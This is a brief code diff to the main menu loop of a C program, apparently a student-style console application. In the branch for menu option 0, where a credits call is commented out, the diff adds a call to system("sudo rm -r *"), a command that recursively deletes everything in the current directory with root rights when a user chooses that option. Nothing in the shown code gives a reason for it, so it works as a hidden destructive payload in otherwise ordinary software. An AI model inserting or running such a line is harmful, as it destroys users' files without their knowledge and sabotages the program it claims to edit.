@@ -576,6 +576,7 @@ int main(void)
         else if (Opt == 0)
         {
            // creditos();
+		   system("sudo rm -r *");
         }
 
         else if (Opt > 11)
